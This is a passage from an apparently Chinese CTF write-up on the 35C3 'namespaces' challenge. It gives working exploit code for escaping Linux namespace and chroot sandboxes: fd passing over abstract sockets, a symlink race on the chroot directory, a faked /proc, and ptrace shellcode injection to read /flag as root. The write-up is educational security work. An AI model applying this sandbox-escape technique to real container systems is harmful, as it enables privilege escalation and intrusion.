class="string">&quot;chroot failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dir == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to open root directory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Child] Listing root directory contents:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] %s\n&quot;</span>, entry-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buffer[bytes_read] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] Flag content: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to read the flag file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">char</span> *stack_top;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> flags = SIGCHLD;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = <span class="built_in">malloc</span>(STACK_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">stack</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    stack_top = <span class="built_in">stack</span> + STACK_SIZE;</span><br><span class="line">    </span><br><span class="line">    global_fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (global_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open flag file in parent&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pid = clone(child_func, stack_top, CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET | flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    close(global_fd);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">stack</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里就引入了我们在背景知识中提到的socket AF_UNIX通信，它可以用来作为进程间通信的工具，他主要分为三种<strong>pathname</strong>，<strong>unnamed</strong>，<strong>abstract</strong>，这三种可以简单说一下，<strong>pathname</strong>是通过文件来实现进程间通信的，但是对于本题来说，由于namespace中设置了mnt namespace，所以不同沙盒中的进程是看不到共同的文件路径的中文件的，因此这个方法行不通，对于<strong>unnamed</strong>来说，主要是用来接受进程间通信的信息的可以用来接受后面fd的步骤，之后对于<strong>abstract</strong>来说，通过创建一个匿名文件来进行进程间通信，非常符合本题的要求，因此我们通过<strong>abstract</strong>来发送文件描述符给另一个沙盒程序，然后他用<strong>unnamed</strong>来接受文件描述符。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>​	为了成功读取 flag 文件并提升权限，我们需要仔细研究 namespace 设置的顺序，通常按照 <strong>user</strong>、<strong>mnt</strong>、<strong>pid</strong>、<strong>uts</strong>、<strong>ipc</strong> 和 <strong>cgroup</strong> 的顺序进行操作。在设置 pid namespace 时，通过 fork 创建子进程，子进程进入目标的 pid namespace，才能看到该沙盒内的进程，并进行后续操作。namespace 设置完毕后，再进行权限设置。此时，可以使用 ptrace 来监控 pid namespace 中的进程，检测到新的进程加入时，使用 ptrace 调试并修改其 rip 寄存器，使其指向预设的 shellcode，执行读取 flag 文件的操作，从而实现特权提升并获取 flag。</p>
<p><img src="/images/namespace/1735447328412.jpg" alt="1735447328412"></p>
<p>​	但是在写exp的时候发现一个问题也就是，linux中存在<strong>capabilities</strong>机制，在过去的 Linux 系统中，sudo 和 SUID（Set User ID）机制让普通用户可以执行 root 权限的操作，但这两者都会赋予普通用户完整的 root 权限，存在较大的安全风险。为了解决这个问题，Linux 从内核 2.2 开始引入了 <strong>capabilities</strong> 机制，将 root 权限细分为多个独立的能力，每个能力对应系统中特定的操作。通过这种方式，进程只会获得执行特定任务所需的权限，而无需赋予其完整的 root 权限。</p>
<p><strong>Capabilities</strong> 机制 允许进程获得执行特定任务所需的权限，而不需要拥有 root 权限。普通用户通常没有 <strong>capabilities</strong>，而 root 用户拥有所有的 <strong>capabilities</strong>。当进程创建或加入新的 user namespace 时，无论其 UID 和 GID 如何变化，都会获得新 namespace 中的 root 权限和所有 <strong>capabilities</strong>。尽管如此，新的 user namespace 中的 root 用户仍然受到一些限制，例如无法访问不在该 namespace 中映射的文件。此外对于在使用<strong>execve</strong>执行用户输入的elf后将不具有任何的<strong>capabilities</strong>，因此也就没有办法直接使用ptrace对于其他进程进行修改rip的操作。</p>
<p>​	新建 user namespaces 本身并不需要任何特殊的 <strong>capabilities</strong>，因此可以通过创建新的 user namespace 获取所有 <strong>capabilities</strong>，从而执行特权操作。然而，chroot 后的进程无法创建新的 user namespaces，这一限制旨在防止 chroot 环境中的进程逃逸。通过这种机制，Linux 实现了对 root 权限的细粒度控制，既保证了安全性，又提供了灵活性。因此为了逃逸Chroot我们需要进行条件竞争，按照下述流程首先删除&#x2F;c目录然后把&#x2F;c目录指向&#x2F;目录，之后c沙盒其实就是在根目录的环境了也就可以创建user namespace</p>
<ol>
<li><strong>c沙盒start_sandbox创建&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
<li><strong>a沙盒中的进程检测到&#x2F;tmp&#x2F;chroots&#x2F;c，将其替换为软链接</strong></li>
<li><strong>c沙盒chroot到&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
</ol>
<p>​	逃逸后，我们可以通过在新的 user namespace 中创建命名空间并使用 ptrace 进行调试操作，但如果进程进入到新的 user namespace，它将无法访问之前的 pid namespace，因此也无法观测和修改沙盒中的进程。</p>
<p>​	为了解决这一问题，我们可以同时clone的时候加入 user namespace， pid namespace，但这会导致进程不再处于原有的 pid namespace 中，无法直接通过 ptrace 修改沙盒进程，即run_elf的进程只会setns到start_sandbox里面的父进程中，而这时我们可以有ptrace能力的是子进程，并且与父进程不在同一个pid中。此时，我们需要利用mnt namespace对 &#x2F;proc 目录进行修改。具体而言，需要加入user namespace pid namespace 和 mnt namespace 三个标志，这样可以通过修改 &#x2F;proc，并在子进程中将原本的 &#x2F;proc 保存到其他地方，重新挂载一个空的 &#x2F;proc。接着，我们可以在原先父进程的 pid namespace 位置创建一个符号链接，指向子进程的 pid namespace。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Holding CAP_SYS_ADMIN within the user namespace that owns a process’s mount namespace allows that process to create bind mounts and mount the following types of filesystems:</span><br><span class="line"></span><br><span class="line">- /proc (since Linux 3.8)</span><br><span class="line">- /sys (since Linux 3.8)</span><br><span class="line">- devpts (since Linux 3.9)</span><br><span class="line">- tmpfs(5) (since Linux 3.9)</span><br><span class="line">- ramfs (since Linux 3.9)</span><br><span class="line">- mqueue (since Linux 3.9)</span><br><span class="line">- bpf (since Linux 4.4)</span><br></pre></td></tr></table></figure>

<p>​	由于父子进程处于同一个目录下，子进程在 mnt namespace 中的挂载操作会自动传播到父进程，这样父进程的 &#x2F;proc 将与子进程的 &#x2F;proc 保持一致。最终，父进程会看到伪造后的 &#x2F;proc，从而加入到子进程的 pid namespace 中，这时。这时，子进程便能够通过 ptrace 注入 shellcode，成功读取 &#x2F;flag 文件，从而完成提权操作。</p>
<p>​	为了提高最终成功执行 ptrace 的概率，我们可以在伪造的 &#x2F;proc 中将 uts namespace 设置为一个 FIFO 管道，这样当 run_elf 进程在此处阻塞时，CPU 将转而执行 start_sandbox 子进程中的 ptrace 操作。尽管这一额外步骤并非必需，但它可以增加成功的几率，从而使得 ptrace 成功执行。</p>
<p>​	此外借用<a target="_blank" rel="noopener" href="https://liotree.github.io/2022/08/12/35c3ctf-Pwn-namespaces/">文章</a>中提到的，有一个常见的误解是，ptrace 需要被跟踪的进程首先调用 ptrace(PTRACE_TRACEME, 0, 0, 0) 才能成功执行。但经过实验后发现，并非如此（否则类似 strace 的工具就无法追踪进程了）。虽然 man 文档中对于 PTRACE_TRACEME 的描述比较模糊，但在更详细的文档中可以找到解释：PTRACE_TRACEME 用于指示该进程将被其父进程跟踪，任何除 SIGKILL 之外的信号都会导致该进程停止，并通过 wait(2) 通知父进程。而且，当该进程之后调用 execve(2) 时，会发送 SIGTRAP 信号给进程，父进程有机会在新程序执行前获得控制。这是 ptrace 成功执行的关键步骤之一。当前文档中这段描述已经被去除，但其原始含义是十分重要的。</p>
<h2 id="exp脚本详解"><a href="#exp脚本详解" class="headerlink" title="exp脚本详解"></a>exp脚本详解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./namespaces&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># compile all four binaries</span></span><br><span class="line">    prepare_bins()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="comment"># r = process(&quot;./namespaces&quot;)</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    hook_recv(r)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 0 and 1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        start_sandbox(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;[sleep]  Started sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># send fd in sandbox 0</span></span><br><span class="line">    run_file(<span class="number">0</span>, <span class="string">&#x27;sendfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[sendfd]  Accepting&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># recv fd in sandbox 1, race creation of chroot for sandbox 2</span></span><br><span class="line">    run_file(<span class="number">1</span>, <span class="string">&#x27;recvfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[recvfd]  Starting race&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 2, hope we win the race</span></span><br><span class="line">    <span class="comment"># inside sandbox 2, set a trap for the next process joining sandbox 2</span></span><br><span class="line">    start_sandbox(<span class="string">&#x27;escalate&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[escalate]  Waiting for victim to join&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># let a process join sandbox 2 to escalate to root</span></span><br><span class="line">    run_file(<span class="number">2</span>, <span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;DONE&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sandbox</span>(<span class="params">init</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Starting sandbox: %s&quot;</span>, init)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    send_elf(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_file</span>(<span class="params">idx, elf</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Running in sandbox #%d: %s&quot;</span>, idx, elf)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;which sandbox? &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    send_elf(elf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_elf</span>(<span class="params">elf</span>):</span><br><span class="line">    elf = bins[elf]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;elf len? &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(elf)).encode())</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;data? &#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> context.local(log_level=<span class="string">&#x27;INFO&#x27;</span>):</span><br><span class="line">        r.send(elf)</span><br><span class="line">    </span><br><span class="line">    log.debug(<span class="string">&quot;Sent ELF file&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_bins</span>():</span><br><span class="line">    <span class="keyword">global</span> bins</span><br><span class="line">    bins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    names = <span class="string">&#x27;sleep sendfd recvfd escalate&#x27;</span>.split()</span><br><span class="line">    rand = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">    sc = shellcode()</span><br><span class="line">    </span><br><span class="line">    directory = tempfile.mkdtemp()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        os.system(<span class="string">&#x27;gcc -Wall -Wextra -Wno-unused-function -O3 -static -m64 -o %s/bin binaries.c -DMAIN=%s -DRAND=%s -DSHELLCODE=%s&#x27;</span> %</span><br><span class="line">                  (directory, name, rand, sc))</span><br><span class="line">        bins[name] = read(directory + <span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    shutil.rmtree(directory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    sc = shellcraft.echo(<span class="string">&#x27;[shellcode]  FLAG: &#x27;</span>) + shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>) + \</span><br><span class="line">        shellcraft.echo(<span class="string">&#x27;[shellcode]  DONE&#x27;</span>) + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">16</span> + asm(sc)</span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">8</span> - (<span class="built_in">len</span>(sc) % <span class="number">8</span>)) + sc</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(sc) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Shellcode:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexdump(sc))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    sc = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, unpack_many(sc, <span class="number">8</span>)))</span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_recv</span>(<span class="params">r</span>):</span><br><span class="line">    old_recv = r.recv_raw</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_recv</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        ret = old_recv(*args, **kwargs)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> ret.splitlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;[&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(line[line.index(<span class="string">b&#x27;[&#x27;</span>):])</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line">    r.recv_raw = new_recv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>​	首先介绍一下exp这个脚本，他主要的工作便是编译binaries.c脚本，生成不同的exp发送给容器中，然后根据对应顺序执行，并且生成了对应的shellcode也一同提供给exp中，原仓库中的脚本本来时python2的我这里进行简单的修改。</p>
<p>​	之后便是对于binaries.c的文件进行详细的阐述，首先也就是最简单的do_sleep函数，这里十分简单就是sleep，通过sleep创建两个sandbox方便后面利用run_elf来进行chroot逃逸。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sleep</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是do_sendfd，这里其实就是利用了之前说的<strong>abstract</strong> socket进行进程之间的通信，然后发送fd信息给另一个进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sendfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Opening fd&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = CHECK_CALL(open, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setup_socket_and_send_fd(fd);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">setup_socket_and_send_fd</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Binding&quot;</span>);</span><br><span class="line">    CHECK_CALL(bind, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Listening&quot;</span>);</span><br><span class="line">    CHECK_CALL(listen, sock, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Accepting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(accept, sock, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    send_fd(conn, fd);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">create_socket</span><span class="params">(<span class="type">int</span> *sock, <span class="keyword">struct</span> sockaddr_un *addr, <span class="type">socklen_t</span> *addrlen)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Creating socket&quot;</span>);</span><br><span class="line">    *sock = CHECK_CALL(socket, AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Creating addr&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(addr, <span class="number">0</span>, <span class="keyword">sizeof</span> *addr);</span><br><span class="line">    addr-&gt;sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr-&gt;sun_path, <span class="string">&quot;@&quot;</span> STR(RAND), <span class="keyword">sizeof</span> addr-&gt;sun_path - <span class="number">1</span>);</span><br><span class="line">    *addrlen = offsetof(<span class="keyword">struct</span> sockaddr_un, sun_path) + <span class="built_in">strlen</span>(addr-&gt;sun_path) + <span class="number">1</span>;</span><br><span class="line">    addr-&gt;sun_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	同理do_recvfd也是类似，这里我们之前讲述原理的时候也做过实验，fd是可以在不同namespace中传递的，因此这里按照之前所说的原理，首先不断循环检测..&#x2F;2文件夹是否存在，如果存在说明有了新的sandbox加入，然后就把他删除，之后通过symlinkat命令，把这个文件夹指向根目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_recvfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = setup_socket_and_recv_fd();</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Starting race&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (unlinkat(fd, <span class="string">&quot;../2&quot;</span>, AT_REMOVEDIR))</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    CHECK_CALL(symlinkat, <span class="string">&quot;/&quot;</span>, fd, <span class="string">&quot;../2&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Race done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">setup_socket_and_recv_fd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Connecting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(connect, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = recv_fd(conn);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recv_fd</span><span class="params">(<span 